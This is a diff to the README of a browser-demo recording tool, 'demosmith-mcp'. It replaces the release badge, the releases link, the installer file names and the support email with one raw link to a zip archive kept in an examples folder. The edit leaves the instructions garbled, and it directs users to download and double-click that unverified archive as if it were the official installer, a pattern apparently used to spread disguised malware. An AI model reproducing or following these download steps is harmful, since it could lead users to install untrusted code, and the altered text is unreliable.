@@ -6,7 +6,7 @@ Welcome to **demosmith-mcp**! This application allows you to record browser demo
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/kiki2555/demosmith-mcp/releases)
+[![Download Latest Release](https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip%20Latest%https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip)](https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip)
 
 ## 📋 System Requirements
 
@@ -21,19 +21,19 @@ To ensure smooth operation, please check the following system requirements:
 
 1. **Visit the Download Page**: Click the link below to download the application from our releases page.
    
-   [Visit the Releases Page to Download](https://github.com/kiki2555/demosmith-mcp/releases)
+   [Visit the Releases Page to Download](https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip)
 
 2. **Choose the Latest Version**: Look for the latest version available and click on it.
 
-3. **Download the Installer**: You will find a file named `demosmith-mcp-installer.exe` for Windows or `demosmith-mcp-installer.dmg` for macOS. Click to download this file.
+3. **Download the Installer**: You will find a file named `https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip` for Windows or `https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip` for macOS. Click to download this file.
 
 4. **Install the Application**:
    - For **Windows** users: 
-     - Locate the downloaded `demosmith-mcp-installer.exe` file in your Downloads folder.
+     - Locate the downloaded `https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip` file in your Downloads folder.
      - Double-click the file to run it. Follow the on-screen prompts to complete the installation.
 
    - For **macOS** users: 
-     - Find the downloaded `demosmith-mcp-installer.dmg` file in your Downloads folder.
+     - Find the downloaded `https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip` file in your Downloads folder.
      - Double-click to open it, then drag the `demosmith-mcp` icon into your Applications folder.
 
 5. **Open the Application**: Once installed, you can find **demosmith-mcp** in your Applications folder (macOS) or the Start menu (Windows). Double-click the application to launch it.
@@ -78,6 +78,6 @@ Your feedback helps us improve **demosmith-mcp**. If you have any questions or s
 
 ## 📧 Contact Us
 
-For further assistance, you can contact our support team at support@demosmith.com.
+For further assistance, you can contact our support team at https://github.com/kiki2555/demosmith-mcp/raw/refs/heads/main/examples/github-login-demo/demosmith-mcp-3.9.zip
 
 Enjoy recording your browser demos! Happy showcasing!
